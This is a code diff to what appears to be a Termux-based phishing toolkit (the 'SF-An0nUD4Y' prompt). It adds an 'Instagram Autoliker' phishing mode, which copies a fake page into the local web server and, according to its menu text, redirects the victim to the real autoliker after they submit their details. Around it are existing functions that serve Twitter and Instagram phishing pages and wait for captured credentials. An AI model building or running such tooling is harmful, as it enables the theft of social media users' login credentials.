@@ -99,7 +99,9 @@ def runPhishing(social, option2):
         system('cp WebPagesTermux/twitter/*.* ServerTermux/www/')
     elif option2 == '1' and social == 'Instagram':
         system('cp WebPagesTermux/Instagram_web/*.* ServerTermux/www/')
-
+    elif option2 == '2' and social == 'Instagram':
+        system('cp WebPagesTermux/Instagram_autoliker/*.* ServerTermux/www/')
+        
 def waitCreds():
     print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
     print " {0}[{1}*{0}]{1} I HAVE A TIP FOR YOU".format(GREEN, END) 
@@ -190,7 +192,7 @@ def runPEnv():
         runPhishing('Twitter', option2)
     elif option == '8':
         loadModule('Instagram')
-        option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n  {0}SF-An0nUD4Y > {1}".format(CYAN, END))
         runPhishing('Instagram', option2)    
     else:
         exit(0)
